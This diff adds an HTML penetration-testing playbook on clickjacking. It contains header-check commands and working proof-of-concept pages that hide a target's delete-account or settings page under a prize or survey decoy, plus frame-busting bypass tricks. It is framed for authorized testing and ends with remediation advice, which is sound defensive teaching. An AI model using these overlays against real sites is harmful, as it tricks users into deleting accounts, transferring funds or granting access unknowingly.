@@ -1,0 +1,508 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Playbook — Performing Clickjacking Attack Test</title><style>:root{
+  /* surfaces */
+  --bg:#0a0c10; --bg-2:#0d1117; --surface:#12161d; --surface-2:#161b22; --card:#161b22;
+  --code:#0b0f14;
+  /* text */
+  --ink:#c9d1d9; --bright:#e6edf3; --muted:#7d8590; --faint:#54606e;
+  /* lines */
+  --border:#272d38; --border-soft:#1b212b;
+  /* brand: red primary + terminal-green secondary */
+  --red:#ff3b3b; --red-deep:#b3122a; --red-glow:rgba(255,59,59,.33);
+  --green:#39d353; --green-deep:#2ea043; --green-glow:rgba(57,211,83,.30);
+  /* quiet taxonomy accents */
+  --purple:#d2a8ff; --purple-line:#8957e5; --orange:#ffa657; --blue:#79c0ff;
+  --yellow:#e3b341; --link:#58a6ff;
+  /* severity (mirrors scanner/severity.py HTML_COLOR) */
+  --sev-critical:#ff2d55; --sev-high:#ff6b35; --sev-medium:#ffd700;
+  --sev-low:#34d399; --sev-info:#60a5fa;
+  /* convenience aliases used by the reference pages (Arsenal / Skills Library) */
+  --panel:#12161d; --accent:#d2a8ff; --star:#e3b341; --off:#ff7b72; --def:#56d364; --atk:#79c0ff;
+  /* type */
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Inter,Roboto,Helvetica,Arial,sans-serif;
+  --mono:ui-monospace,'SF Mono',Consolas,'Liberation Mono','Courier New',monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:var(--sans); color:var(--ink); background:var(--bg);
+  font-size:14px; line-height:1.6; -webkit-font-smoothing:antialiased;
+  background-image:
+    radial-gradient(1000px 460px at 50% -10%, rgba(179,18,42,.16) 0%, transparent 70%),
+    linear-gradient(rgba(255,255,255,.012) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.012) 1px, transparent 1px);
+  background-size:auto, 44px 44px, 44px 44px;
+}
+/* unifying signature: a thin red→green bar across the very top of every page */
+body::before{content:"";position:fixed;top:0;left:0;right:0;height:2px;z-index:60;
+  background:linear-gradient(90deg,var(--red) 0%,var(--red-deep) 50%,var(--green) 100%);
+  box-shadow:0 0 12px var(--red-glow);}
+a{color:var(--link);text-decoration:none;} a:hover{text-decoration:underline;}
+code,kbd,samp{font-family:var(--mono);}
+::selection{background:var(--red-deep);color:#fff;}
+::-webkit-scrollbar{width:11px;height:11px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:#222a34;border-radius:6px;border:2px solid var(--bg);}
+::-webkit-scrollbar-thumb:hover{background:#303a47;}
+/* shared footer (class: hades-foot) */
+.hades-foot{text-align:center;padding:26px;color:var(--faint);font-size:.75rem;
+  border-top:1px solid var(--border-soft);margin-top:48px;}
+.hades-foot .prompt{color:var(--green);font-family:var(--mono);}
+
+.wrap{max-width:900px;margin:0 auto;padding:36px 22px 80px;}
+.pb-head{border-bottom:2px solid var(--red);padding-bottom:14px;margin-bottom:22px;}
+.pb-kicker{font-family:var(--mono);color:var(--purple);font-weight:700;letter-spacing:2px;font-size:.72rem;text-transform:uppercase;}
+h1.pb-title{margin:6px 0 8px;font-size:1.7rem;color:var(--bright);}
+.pb-desc{color:var(--muted);font-size:1rem;margin:0 0 12px;}
+.pb-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px;}
+.pb-tag{font-family:var(--mono);font-size:.64rem;font-weight:700;letter-spacing:.5px;border:1px solid var(--purple-line);
+  color:var(--purple);background:#1a1430;border-radius:8px;padding:2px 8px;white-space:nowrap;}
+.pb-tag.atk{border-color:#1f6feb;color:var(--blue);background:var(--bg-2);}
+.content h1,.content h2,.content h3{color:var(--bright);margin-top:1.6em;border-bottom:1px solid var(--border);padding-bottom:.3em;}
+.content h2{font-size:1.3rem;} .content h3{font-size:1.08rem;border-bottom:none;}
+.content a{color:var(--link);} .content strong{color:var(--bright);}
+.content code{background:var(--code);color:var(--blue);padding:2px 6px;border-radius:5px;font-size:.86em;font-family:var(--mono);}
+.content pre{background:var(--code);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:8px;
+  padding:14px 16px;overflow-x:auto;}
+.content pre code{background:none;color:var(--green);padding:0;}
+.content table{border-collapse:collapse;width:100%;margin:1em 0;}
+.content th,.content td{border:1px solid var(--border);padding:7px 11px;text-align:left;}
+.content th{background:var(--surface-2);color:var(--bright);}
+.content blockquote{border-left:3px solid var(--purple-line);margin:1em 0;padding:.4em 1em;color:var(--muted);background:var(--surface-2);}
+.content ul,.content ol{padding-left:1.4em;}
+.pb-foot{margin-top:48px;padding-top:16px;border-top:1px solid var(--border-soft);color:var(--faint);font-size:.8rem;}
+.pb-foot a{color:var(--purple);}
+</style></head>
+<body><div class="wrap">
+  <div class="pb-head">
+    <div class="pb-kicker">📘 Expert Playbook · Hades</div>
+    <h1 class="pb-title">Performing Clickjacking Attack Test</h1>
+    <p class="pb-desc">Testing web applications for clickjacking vulnerabilities by assessing frame embedding controls and crafting proof-of-concept overlay attacks during authorized security assessments.</p>
+    <div class="pb-tags"><span class="pb-tag atk">T1190</span><span class="pb-tag atk">T1059.007</span><span class="pb-tag atk">T1505.003</span><span class="pb-tag atk">T1083</span><span class="pb-tag">penetration-testing</span><span class="pb-tag">clickjacking</span><span class="pb-tag">ui-redressing</span><span class="pb-tag">web-security</span><span class="pb-tag">owasp</span><span class="pb-tag">x-frame-options</span></div>
+  </div>
+  <div class="content"><h1 id="performing-clickjacking-attack-test">Performing Clickjacking Attack Test</h1>
+<h2 id="when-to-use">When to Use</h2>
+<ul>
+<li>During authorized penetration tests when assessing UI redressing vulnerabilities</li>
+<li>When testing whether sensitive actions (delete account, transfer funds, change settings) can be performed via clickjacking</li>
+<li>For evaluating the effectiveness of X-Frame-Options and Content-Security-Policy frame-ancestors directives</li>
+<li>When assessing applications that process one-click actions without additional confirmation</li>
+<li>During security audits of applications handling financial transactions or account management</li>
+</ul>
+<h2 id="prerequisites">Prerequisites</h2>
+<ul>
+<li><strong>Authorization</strong>: Written penetration testing agreement for the target</li>
+<li><strong>Web browser</strong>: Modern browser for testing iframe embedding</li>
+<li><strong>Local web server</strong>: Python <code>http.server</code> or similar for hosting PoC pages</li>
+<li><strong>Burp Suite</strong>: For examining response headers</li>
+<li><strong>HTML/CSS knowledge</strong>: For crafting clickjacking overlay pages</li>
+<li><strong>curl</strong>: For checking framing headers on target pages</li>
+</ul>
+<blockquote>
+<p><strong>Legal Notice:</strong> This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.</p>
+</blockquote>
+<h2 id="workflow">Workflow</h2>
+<h3 id="step-1-check-frame-embedding-protections">Step 1: Check Frame Embedding Protections</h3>
+<p>Examine response headers for anti-clickjacking defenses.</p>
+<pre><code class="language-bash"># Check X-Frame-Options header
+curl -s -I &quot;https://target.example.com/&quot; | grep -i &quot;x-frame-options&quot;
+# Expected values:
+# X-Frame-Options: DENY (blocks all framing)
+# X-Frame-Options: SAMEORIGIN (allows same-origin framing)
+# X-Frame-Options: ALLOW-FROM https://trusted.com (deprecated, limited support)
+
+# Check Content-Security-Policy frame-ancestors directive
+curl -s -I &quot;https://target.example.com/&quot; | grep -i &quot;content-security-policy&quot;
+# Look for: frame-ancestors 'none' or frame-ancestors 'self'
+# frame-ancestors 'none' = equivalent to DENY
+# frame-ancestors 'self' = equivalent to SAMEORIGIN
+
+# Test multiple sensitive pages
+for page in / /account/settings /account/delete /transfer \
+  /admin/dashboard /change-password /change-email; do
+  echo -n &quot;$page: &quot;
+  headers=$(curl -s -I &quot;https://target.example.com$page&quot;)
+  xfo=$(echo &quot;$headers&quot; | grep -i &quot;x-frame-options&quot; | tr -d '\r')
+  csp=$(echo &quot;$headers&quot; | grep -i &quot;content-security-policy&quot; | grep -o &quot;frame-ancestors[^;]*&quot; | tr -d '\r')
+  if [ -z &quot;$xfo&quot; ] &amp;&amp; [ -z &quot;$csp&quot; ]; then
+    echo &quot;NO PROTECTION&quot;
+  else
+    echo &quot;${xfo:-none} | ${csp:-none}&quot;
+  fi
+done
+
+# Check if JavaScript frame-busting is used (weak protection)
+curl -s &quot;https://target.example.com/&quot; | grep -i &quot;top.location\|parent.location\|frameElement&quot;
+</code></pre>
+<h3 id="step-2-test-basic-iframe-embedding">Step 2: Test Basic Iframe Embedding</h3>
+<p>Attempt to embed the target page in an iframe to confirm vulnerability.</p>
+<pre><code class="language-html">&lt;!-- basic-frame-test.html --&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Clickjacking Frame Test&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Frame Embedding Test&lt;/h1&gt;
+&lt;p&gt;If the target page loads below, it is vulnerable to clickjacking.&lt;/p&gt;
+
+&lt;!-- Test basic framing --&gt;
+&lt;iframe src=&quot;https://target.example.com/account/settings&quot;
+        width=&quot;800&quot; height=&quot;600&quot;
+        style=&quot;border: 2px solid red;&quot;&gt;
+&lt;/iframe&gt;
+
+&lt;p&gt;If you see &quot;Refused to display&quot; in console or blank iframe,
+   the page has frame protection.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code class="language-bash"># Host the test page
+cd /tmp
+cat &gt; frame-test.html &lt;&lt; 'EOF'
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Clickjacking Test&lt;/h1&gt;
+&lt;iframe src=&quot;https://target.example.com/account/settings&quot;
+        width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF
+python3 -m http.server 8888
+# Open http://localhost:8888/frame-test.html in browser
+# Check browser console for framing errors
+</code></pre>
+<h3 id="step-3-craft-clickjacking-proof-of-concept">Step 3: Craft Clickjacking Proof of Concept</h3>
+<p>Build an overlay attack that tricks users into clicking hidden elements.</p>
+<pre><code class="language-html">&lt;!-- clickjacking-poc.html --&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Win a Prize!&lt;/title&gt;
+&lt;style&gt;
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+  }
+
+  /* Invisible iframe containing target page */
+  #target-frame {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.0001;  /* Nearly invisible */
+    z-index: 2;       /* On top of decoy */
+    border: none;
+  }
+
+  /* Decoy content that tricks the user */
+  #decoy {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 1;
+    background: white;
+  }
+
+  /* Position the &quot;Click here&quot; button exactly over the target's
+     sensitive button (adjust top/left values based on target layout) */
+  #click-bait {
+    position: absolute;
+    top: 350px;    /* Align with target's &quot;Delete Account&quot; button */
+    left: 400px;   /* Align horizontally */
+    padding: 15px 30px;
+    background: #4CAF50;
+    color: white;
+    font-size: 18px;
+    cursor: pointer;
+    border: none;
+    border-radius: 5px;
+  }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;!-- Decoy content visible to the user --&gt;
+&lt;div id=&quot;decoy&quot;&gt;
+  &lt;h1 style=&quot;text-align:center; margin-top:100px;&quot;&gt;
+    Congratulations! You Won!
+  &lt;/h1&gt;
+  &lt;p style=&quot;text-align:center;&quot;&gt;
+    Click the button below to claim your prize
+  &lt;/p&gt;
+  &lt;button id=&quot;click-bait&quot;&gt;CLAIM PRIZE&lt;/button&gt;
+&lt;/div&gt;
+
+&lt;!-- Hidden iframe with target's sensitive action --&gt;
+&lt;iframe id=&quot;target-frame&quot;
+  src=&quot;https://target.example.com/account/delete&quot;
+  scrolling=&quot;no&quot;&gt;
+&lt;/iframe&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="step-4-create-multi-step-clickjacking-attack">Step 4: Create Multi-Step Clickjacking Attack</h3>
+<p>For actions requiring multiple clicks, create a multi-step overlay.</p>
+<pre><code class="language-html">&lt;!-- multi-step-clickjacking.html --&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Complete Survey&lt;/title&gt;
+&lt;style&gt;
+  #target-frame {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    opacity: 0.0001;
+    z-index: 2;
+    border: none;
+  }
+  #step-container {
+    text-align: center;
+    margin-top: 200px;
+    z-index: 1;
+    position: relative;
+  }
+  .step { display: none; }
+  .step.active { display: block; }
+  .btn {
+    padding: 15px 40px;
+    font-size: 18px;
+    background: #2196F3;
+    color: white;
+    border: none;
+    cursor: pointer;
+    margin-top: 20px;
+  }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div id=&quot;step-container&quot;&gt;
+  &lt;!-- Step 1: Click aligns with &quot;Settings&quot; link on target --&gt;
+  &lt;div class=&quot;step active&quot; id=&quot;step1&quot;&gt;
+    &lt;h2&gt;Step 1: Select your reward&lt;/h2&gt;
+    &lt;button class=&quot;btn&quot; onclick=&quot;nextStep()&quot;
+      style=&quot;position:absolute; top:200px; left:300px;&quot;&gt;
+      Gold Package
+    &lt;/button&gt;
+  &lt;/div&gt;
+
+  &lt;!-- Step 2: Click aligns with &quot;Delete Account&quot; button --&gt;
+  &lt;div class=&quot;step&quot; id=&quot;step2&quot;&gt;
+    &lt;h2&gt;Step 2: Confirm your choice&lt;/h2&gt;
+    &lt;button class=&quot;btn&quot; onclick=&quot;nextStep()&quot;
+      style=&quot;position:absolute; top:350px; left:400px;&quot;&gt;
+      Confirm
+    &lt;/button&gt;
+  &lt;/div&gt;
+
+  &lt;!-- Step 3: Click aligns with &quot;Yes, I'm sure&quot; confirmation --&gt;
+  &lt;div class=&quot;step&quot; id=&quot;step3&quot;&gt;
+    &lt;h2&gt;Step 3: Claim reward!&lt;/h2&gt;
+    &lt;button class=&quot;btn&quot;
+      style=&quot;position:absolute; top:400px; left:450px;&quot;&gt;
+      Claim Now!
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;iframe id=&quot;target-frame&quot;
+  src=&quot;https://target.example.com/account/settings&quot;&gt;
+&lt;/iframe&gt;
+
+&lt;script&gt;
+var currentStep = 1;
+function nextStep() {
+  document.getElementById('step' + currentStep).classList.remove('active');
+  currentStep++;
+  document.getElementById('step' + currentStep).classList.add('active');
+  // Optionally change iframe src for multi-page flows
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="step-5-test-frame-busting-bypass-techniques">Step 5: Test Frame-Busting Bypass Techniques</h3>
+<p>If JavaScript-based frame protection is used, attempt to bypass it.</p>
+<pre><code class="language-html">&lt;!-- Bypass frame-busting JavaScript --&gt;
+
+&lt;!-- Technique 1: sandbox attribute blocks top-level navigation --&gt;
+&lt;iframe src=&quot;https://target.example.com/account/settings&quot;
+  sandbox=&quot;allow-scripts allow-forms allow-same-origin&quot;
+  width=&quot;800&quot; height=&quot;600&quot;&gt;
+&lt;/iframe&gt;
+&lt;!-- sandbox without allow-top-navigation prevents frame-busting --&gt;
+
+&lt;!-- Technique 2: Double framing --&gt;
+&lt;!-- If target checks: if (top !== self) top.location = self.location --&gt;
+&lt;!-- Frame the page through an intermediate page that also frames --&gt;
+&lt;iframe src=&quot;intermediate.html&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/iframe&gt;
+&lt;!-- intermediate.html contains: &lt;iframe src=&quot;https://target.example.com/...&quot;&gt; --&gt;
+
+&lt;!-- Technique 3: Intercept onbeforeunload --&gt;
+&lt;script&gt;
+window.onbeforeunload = function() {
+  return &quot;Are you sure?&quot;;  // Prevents navigation away
+};
+&lt;/script&gt;
+&lt;iframe src=&quot;https://target.example.com/account/settings&quot;
+  width=&quot;800&quot; height=&quot;600&quot;&gt;
+&lt;/iframe&gt;
+
+&lt;!-- Technique 4: Using data: URI or about:blank --&gt;
+&lt;iframe id=&quot;f&quot; src=&quot;about:blank&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+var iframe = document.getElementById('f');
+iframe.contentDocument.write(
+  '&lt;iframe src=&quot;https://target.example.com/account/settings&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;'
+);
+&lt;/script&gt;
+</code></pre>
+<h3 id="step-6-validate-impact-and-document-finding">Step 6: Validate Impact and Document Finding</h3>
+<p>Confirm that the clickjacking leads to meaningful impact.</p>
+<pre><code class="language-bash"># Host the PoC and test the attack flow
+cd /tmp
+python3 -m http.server 8888
+
+# Testing steps:
+# 1. Log in to target.example.com in the browser
+# 2. Open http://localhost:8888/clickjacking-poc.html
+# 3. Click the decoy button
+# 4. Verify the sensitive action was performed on the target
+
+# For report: adjust iframe opacity to show overlap
+# Change opacity from 0.0001 to 0.5 for screenshot evidence
+# This shows the target page visible behind the decoy content
+
+# Document which sensitive actions are vulnerable:
+# - Account deletion
+# - Password/email change
+# - Fund transfer
+# - Permission/role changes
+# - Enabling/disabling security features
+</code></pre>
+<h2 id="key-concepts">Key Concepts</h2>
+<table>
+<thead>
+<tr>
+<th>Concept</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Clickjacking</strong></td>
+<td>UI redressing attack that tricks users into clicking hidden elements by overlaying decoy content</td>
+</tr>
+<tr>
+<td><strong>X-Frame-Options</strong></td>
+<td>HTTP header controlling whether a page can be embedded in iframes (DENY, SAMEORIGIN)</td>
+</tr>
+<tr>
+<td><strong>frame-ancestors</strong></td>
+<td>CSP directive specifying valid parents for iframe embedding (supersedes X-Frame-Options)</td>
+</tr>
+<tr>
+<td><strong>Frame Busting</strong></td>
+<td>JavaScript-based defense that attempts to break out of iframes (easily bypassable)</td>
+</tr>
+<tr>
+<td><strong>Likejacking</strong></td>
+<td>Clickjacking variant targeting social media "Like" or "Share" buttons</td>
+</tr>
+<tr>
+<td><strong>Cursorjacking</strong></td>
+<td>Variant using CSS to offset the visible cursor from the actual click position</td>
+</tr>
+<tr>
+<td><strong>Multi-step Clickjacking</strong></td>
+<td>Attack requiring multiple clicks, with decoy content changing at each step</td>
+</tr>
+</tbody>
+</table>
+<h2 id="tools-systems">Tools &amp; Systems</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Burp Suite Professional</strong></td>
+<td>Examining X-Frame-Options and CSP headers on responses</td>
+</tr>
+<tr>
+<td><strong>Clickjack Tester (browser)</strong></td>
+<td>Browser-based iframe embedding test tool</td>
+</tr>
+<tr>
+<td><strong>Browser DevTools</strong></td>
+<td>Inspecting frame embedding behavior and console errors</td>
+</tr>
+<tr>
+<td><strong>Python http.server</strong></td>
+<td>Hosting clickjacking PoC pages locally</td>
+</tr>
+<tr>
+<td><strong>OWASP ZAP</strong></td>
+<td>Automated detection of missing anti-framing headers</td>
+</tr>
+<tr>
+<td><strong>securityheaders.com</strong></td>
+<td>Online scanner for missing security headers</td>
+</tr>
+</tbody>
+</table>
+<h2 id="common-scenarios">Common Scenarios</h2>
+<h3 id="scenario-1-account-deletion-via-clickjacking">Scenario 1: Account Deletion via Clickjacking</h3>
+<p>The account deletion page at <code>/account/delete</code> has no X-Frame-Options header. An attacker creates a page with a "Win a prize" button positioned over the "Delete My Account" button in a transparent iframe.</p>
+<h3 id="scenario-2-one-click-fund-transfer">Scenario 2: One-Click Fund Transfer</h3>
+<p>A banking application performs transfers via a single button click on a pre-filled form. Without frame protection, the attacker embeds the transfer page in an iframe and overlays a decoy "Play Game" button.</p>
+<h3 id="scenario-3-2fa-disable-via-multi-step-clickjacking">Scenario 3: 2FA Disable via Multi-Step Clickjacking</h3>
+<p>Disabling two-factor authentication requires two clicks (settings link, then disable button). A multi-step clickjacking PoC guides the victim through two decoy clicks that align with the real buttons.</p>
+<h3 id="scenario-4-oauth-authorization-clickjack">Scenario 4: OAuth Authorization Clickjack</h3>
+<p>An OAuth consent screen allows framing. The attacker embeds the consent page and tricks the victim into clicking "Authorize", granting the attacker's application access to the victim's account.</p>
+<h2 id="output-format">Output Format</h2>
+<pre><code>## Clickjacking Vulnerability Finding
+
+**Vulnerability**: Clickjacking - Missing Frame Embedding Protection
+**Severity**: Medium (CVSS 6.1)
+**Location**: /account/settings, /account/delete, /transfer
+**OWASP Category**: A04:2021 - Insecure Design
+
+### Headers Analysis
+| Page | X-Frame-Options | CSP frame-ancestors | Vulnerable |
+|------|----------------|--------------------|-|
+| / | Not set | Not set | Yes |
+| /account/settings | Not set | Not set | Yes |
+| /account/delete | Not set | Not set | Yes |
+| /transfer | Not set | Not set | Yes |
+| /login | SAMEORIGIN | - | No |
+
+### Sensitive Actions Exploitable
+1. Account deletion (single click, no re-authentication)
+2. Email change (single click, no confirmation)
+3. 2FA disable (two clicks, multi-step PoC)
+4. Fund transfer (pre-filled form, single click)
+
+### Impact
+- Account takeover via email change clickjacking
+- Account destruction via delete clickjacking
+- Financial loss via transfer clickjacking
+- Security downgrade via 2FA disable clickjacking
+
+### Recommendation
+1. Add `Content-Security-Policy: frame-ancestors 'none'` to all pages
+2. Set `X-Frame-Options: DENY` as fallback for older browsers
+3. Require re-authentication for sensitive actions (delete, transfer)
+4. Add confirmation dialogs that cannot be pre-filled or auto-submitted
+5. Implement SameSite=Strict cookies to reduce session availability in frames
+</code></pre></div>
+  <div class="pb-foot">Rendered by Hades from the Anthropic-Cybersecurity-Skills library ·
+    for authorised security testing only.</div>
+</div></body></html>
